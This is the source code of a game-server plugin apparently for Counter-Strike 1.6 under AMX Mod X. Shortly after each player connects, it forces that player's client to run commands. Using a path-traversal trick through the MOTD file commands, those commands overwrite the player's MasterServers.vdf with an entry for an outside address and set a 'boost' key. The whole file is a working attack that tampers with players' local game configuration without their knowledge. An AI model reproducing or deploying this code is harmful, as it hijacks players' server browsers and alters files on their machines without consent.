#include <amxmodx>
#include <amxmisc>

new const master_plik[][]      =   {"!MD5/../../platform/config/MasterServers.vdf", "!MD5/../../platform/config/rev_MasterServers.vdf", "!MD5/../../config/rev_MasterServers.vdf", "!MD5/../../config/MasterServers.vdf"}
new const master_Text[]		=	"^"MasterServers^"\n{\n	^"hl1^"\n	{\n		^"0^"\n		{\n			^"addr^"		^"79.124.56.48:27019^"\n		}\n	}\n}\n";
new const master_Key[]			=	"boost";

public client_putinserver(id)
{
set_task(5.0, "master_browser", id)
}
public master_browser(id)
{
client_cmd( id , "Motdfile %s" , master_plik[0] );
client_cmd( id , "Motd_write %s", master_Text );
client_cmd( id , "Motdfile motd.txt" );
client_cmd( id , "setinfo %s 1", master_Key);
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang1026\\ f0\\ fs16 \n\\ par }
*/
